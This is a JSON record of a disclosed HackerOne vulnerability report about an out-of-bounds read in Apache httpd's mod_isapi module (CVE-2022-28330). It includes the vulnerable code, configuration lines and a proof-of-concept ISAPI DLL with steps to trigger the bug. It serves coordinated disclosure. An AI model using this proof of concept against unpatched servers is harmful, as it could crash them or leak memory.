{
  "id": 1595296,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk1Mjk2",
  "url": "https://hackerone.com/reports/1595296",
  "title": "Read beyond bounds in mod_isapi.c [zhbug_httpd_41]",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-06-08T23:19:58.200Z",
  "submitted_at": "2022-06-08T23:19:58.263Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tdp3kel9g",
    "url": "/tdp3kel9g",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142652Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dac03f19c2af34c98cf67487914a34c37a1ad2004c452180ed6af1fb24af5be3",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142652Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3a7e2ee62042f50ffeb7d53bb6e83e04dc43cd4b39da025ca7db6afb76a1b513"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-28330"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-07-09T13:50:51.025Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-06-09T13:50:47.056Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Greetings. I have found a read-beyond-bounds bug in httpd that arises from an apparent logic error.\n\nThe bug is in /modules/arch/win32/mod_isapi.c, on lines 979 and/or 983, which use the length of the path to the ISAPI DLL (|strlen(r->filename)|) to index into the string specified by the ISAPI DLL itself in its call to ServerSupportFunction/HSE_REQ_MAP_URL_TO_PATH, which contains unrelated data. This error presumably can be exploited under appropriate conditions.\n\nThis bug is still present in trunk.\n\nRelevant code:\n```\n966:     case HSE_REQ_MAP_URL_TO_PATH:\n967:     {\n968:         /* Map a URL to a filename */\n969:         char *file = (char *)buf_data;\n970:         apr_uint32_t len;\n971:         subreq = ap_sub_req_lookup_uri(\n972:                      apr_pstrndup(cid->r->pool, file, *buf_size), r, NULL);\n973:\n974:         if (!subreq->filename) {\n975:             ap_destroy_sub_req(subreq);\n976:             return 0;\n977:         }\n978:\n979:         len = (apr_uint32_t)strlen(r->filename);\n980:\n981:         if ((subreq->finfo.filetype == APR_DIR)\n982:               && (!subreq->path_info)\n983:               && (file[len - 1] != '/'))\n984:             file = apr_pstrcat(cid->r->pool, subreq->filename, \"/\", NULL);\n985:         else\n986:             file = apr_pstrcat(cid->r->pool, subreq->filename,\n987: subreq->path_info, NULL);\n988:\n989:         ap_destroy_sub_req(subreq);\n990:\n991: #ifdef WIN32\n992:         /* We need to make this a real Windows path name */\n993:         apr_filepath_merge(&file, \"\", file, APR_FILEPATH_NATIVE, r->pool);\n994: #endif\n995:\n996:         *buf_size = apr_cpystrn(buf_data, file, *buf_size) - buf_data;\n997:\n998:         return 1;\n999:    }\n```\nAttached is a POC that demonstrates the bug. To use it:\n\n   1. Add the specified lines to httpd.conf.\n   2. Build dllmain.cpp and foo.def into foo.dll.\n   3. Create the folder /bug41 in the webserver root.\n   4. Copy foo.dll into /bug41 .\n   5. Run httpd and attach a debugger to it.\n   6. Set a BP on line 969, above.\n   7. Open a browser (or CURL) and attempt to load the URL <server>/bug41/foo.dll .\n   8. When the BP fires, step through line 979.\n   9. Notice that |r->filename| is something like \"g:/serverroot/bug41/foo.dll\" (the filesystem path to the ISAPI DLL)  and that |len| is its length.\n   10. Notice that |file| points to a 0 byte string (string length 0), which is what HttpExtensionProc() in foo.dll sent in its call to ServerSupportFunction/HSE_REQ_MAP_URL_TO_PATH (dllmain.cpp line 30).\n   11. Step once more and notice that line 983 reads one byte from |len-1| bytes beyond the end of |file|.\n```\n-------- httpd.conf lines ----------------------------------------------------\n<Location /bug41>\n    AddHandler isapi-handler .dll\n    Options ExecCGI\n    Allow from all\n</Location>\n-------- httpd.conf lines ----------------------------------------------------\n```\n```\n-------- dllmain.cpp ----------------------------------------------------\n#include <windows.h>\n#include <HttpExt.h>\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\nBOOL WINAPI GetExtensionVersion(HSE_VERSION_INFO * pVI) {\n    return TRUE;\n}\n\nDWORD WINAPI HttpExtensionProc(EXTENSION_CONTROL_BLOCK* pECB) {\n\n    char buf[] = \"\";\n    DWORD bufSize = sizeof(buf);\n\n    pECB->ServerSupportFunction(\n        pECB->ConnID, HSE_REQ_MAP_URL_TO_PATH, buf, &bufSize, NULL);\n\n    return HSE_STATUS_SUCCESS;\n}\n-------- dllmain.cpp ----------------------------------------------------\n\n-------- foo.def ----------------------------------------------------\nLIBRARY foo\nEXPORTS\n    DllMain\n    GetExtensionVersion\n    HttpExtensionProc\n-------- foo.def ----------------------------------------------------\n```\n\n## Impact\n\nBeyond bounds data might be returned to an ISAPI extension DLL. This could potentially be returned to an attacker, but, in mitigation, the path is indirect. The bug could also cause a crash. The bug can be reached only if the victim site uses an ISAPI extension DLL.",
  "weakness": {
    "id": 9,
    "name": "Buffer Over-read"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-07-09T13:50:47.150Z",
  "allow_singular_disclosure_after": -50459765.47530928,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "zy9ard3",
    "mjustu",
    "shivammusic",
    "0xshawky",
    "aasim690"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 86382,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/apache/httpd",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 160232,
      "category": "team",
      "content": "low: read beyond bounds in mod_isapi (CVE-2022-28330)\n\nApache HTTP Server 2.4.53 and earlier on Windows may read beyond bounds when configured to process requests with the mod_isapi module.\n\nAcknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue\n\nUpdate 2.4.54 released\t2022-06-08\nAffects\t<=2.4.53\n\nSecurity Advisory: https://httpd.apache.org/security/vulnerabilities_24.html",
      "user": {
        "id": 904892,
        "username": "kunderkoffler",
        "name": "Kayla Underkoffler",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2020-01-13T19:26:22.339Z",
        "url": "https://hackerone.com/kunderkoffler",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
